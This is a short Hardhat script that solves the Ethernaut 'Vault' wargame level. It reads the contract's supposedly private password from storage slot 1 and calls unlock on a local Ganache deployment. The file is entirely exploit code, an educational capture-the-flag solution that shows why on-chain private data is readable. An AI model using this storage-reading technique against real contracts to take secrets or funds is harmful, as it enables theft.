// Unlock the vault to pass the level!

const hre = require("hardhat");

async function main() {
  // Deployed on Ganache
  [player] = await ethers.getSigners();

  // Get an instance of the contract deployed by Ethernaut
  const VaultAddress = "0x3fA9b13633c1775B697A61818d2C6ec8ef2f5455"
  this.vault = await hre.ethers.getContractAt("Vault",VaultAddress);

  console.log(
    `
    Vault locked status before the attack ${await this.vault.locked()} \n
    `
  );

  console.log("\n Performing attack ... \n\n");

  // Deciphering the vault's password
  console.log("Deciphering the vault's password ...");
  const bytes32Password = await hre.ethers.provider.getStorageAt(this.vault.address,1);
  const password = await hre.ethers.BigNumber.from(bytes32Password);

  console.log(
    `
    bytes32Password: ${bytes32Password} \n
    Password: ${password} \n
    `
  );

  console.log("Unlocking the vault ...");
  const tx = await this.vault.connect(player).unlock(bytes32Password);
  
  // Await for the tx to be mined
  let txResult = await tx.wait();

  console.log("transaction " , txResult);

  console.log("===============================================\n===============================================\n");
  console.log("\n Results after performing the attack \n\n");

  console.log(
    `
    Vault locked status before the attack ${await this.vault.locked()} \n
    `
  );

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});